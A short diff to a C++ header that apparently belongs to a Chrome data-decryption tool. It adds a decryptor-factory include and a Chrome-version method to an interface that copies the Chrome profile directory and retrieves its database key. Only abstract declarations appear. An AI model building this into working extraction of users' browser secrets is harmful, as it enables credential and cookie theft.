@@ -1,5 +1,6 @@
 #pragma once
 #include "stdafx.h"
+#include "IDecryptorFactory.h"
 
 namespace google
 {
@@ -13,6 +14,7 @@ namespace google
         virtual void CopyGoogleChromeFullDirWithKey() = 0;
     protected:
         virtual void GetKey(std::vector<unsigned char>& dbKey) = 0;
+        virtual crypt::ChromeVersion GetVersion() = 0;
     private:
         virtual std::string GetUName() = 0;
     protected:
